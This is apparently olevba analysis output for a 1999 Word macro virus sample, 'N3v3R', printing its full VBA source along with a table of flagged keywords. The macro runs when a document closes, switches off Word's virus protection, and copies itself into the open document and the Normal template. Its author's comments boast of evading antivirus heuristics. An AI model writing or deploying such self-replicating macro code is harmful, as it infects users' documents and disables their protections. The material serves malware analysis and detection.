olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ever.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ever.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' N3v3R v1.1 by SPo0Ky and Buddy Music of the group VX4U
' 23rd June 1999
' SR-1 Compatible MS-Word Class bug with 4 lines of code.
' Includes "the basic stuff", a small payload which
' would set a random password (though it never gets activated),
' and as a bonus it is even undetectable by F-Prot's and AVP's
' heuristics :-)

Private Sub Document_Close()
Options.VirusProtection = False ' the basic stuff you asked for :-)
If ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100) ' infection and infection check of the activedocument
If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100) ' infection and infection check of the normaltemplate
If Day(Now) = "N3v3R" Then ActiveDocument.Password = ActiveDocument.Words(1) ' a payload which would set a "random" password if the day is "N3v3R" (enough to prove my point, you know ;-)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

